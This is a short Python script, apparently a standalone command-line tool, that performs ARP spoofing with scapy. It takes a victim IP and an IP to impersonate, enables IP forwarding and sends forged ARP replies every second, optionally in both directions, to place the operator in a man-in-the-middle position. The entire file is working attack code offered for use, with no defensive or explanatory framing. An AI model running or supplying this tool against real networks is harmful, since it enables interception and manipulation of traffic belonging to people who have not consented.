#!/usr/bin/python3

import scapy.all as scapy
import optparse
import time

def change_ipforward(opt):
    ip_forwar = open("/proc/sys/net/ipv4/ip_forward", "w")
    ip_forwar.write(opt)
    ip_forwar.close()

def get_mac(ip):
    arp_broad1 = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    return scapy.srp(arp_broad1, timeout=1, verbose=False)[0][0][1].src

def arpSpoof(ipTarget1, ipTarget2, twoWays):

    try:
        print("[+] Genering Packets")

        mac_victim = get_mac(ipTarget1)
        packet1 = scapy.ARP(op=2, pdst=ipTarget1, hwdst = mac_victim, psrc=ipTarget2)

        mac_replace = ""
        packet2 = ""

        print("[+] Attacking", end="")

        if(twoWays): 
            print(" with two ways...")

            mac_replace = get_mac(ipTarget2)
            packet2 = scapy.ARP(op=2, pdst=ipTarget2, hwdst = mac_replace, psrc=ipTarget1)

        print("")    

        packetCount = 0
        change_ipforward("1")

        while(True):
            scapy.send(packet1, verbose=False)
            if(twoWays):
                scapy.send(packet2, verbose=False)
                packetCount += 1
            packetCount+=1
            print("\r[+] Sending "+str(packetCount)+" packets", end="")
            time.sleep(1)
        
    except KeyboardInterrupt:
        change_ipforward("0")
        print("\n[!] Attack finished...")
    
def main():

    try:
        # obtain data
        parser = optparse.OptionParser()
        parser.add_option("-V", "--victim", dest="v",  help="Ip address of victim")
        parser.add_option("-R", "--replace", dest="r",  help="Ip address to replace")
        parser.add_option("-T", "--twoWays", action="store_true", default=False, dest="t", help="Two ways for victim (responses packets add)")

        (option, argument) = parser.parse_args()
        victim = option.v
        replace = option.r
        twoWays = option.t

        if victim and replace:
            if(victim.find("/") == -1 and replace.find("/") == - 1):
                arpSpoof(victim, replace, twoWays)
            else:
                print("[-] Enter IP address correctly")

        elif victim or replace:
            print("[-] You need enter an ip address of victim and a replace")
        else:
            print("[?] Use the option '-h' or '--help' to view the functions")
    except PermissionError:
        print("[-]You need administrator permission to execute this script")
if(__name__== "__main__"):
    main()
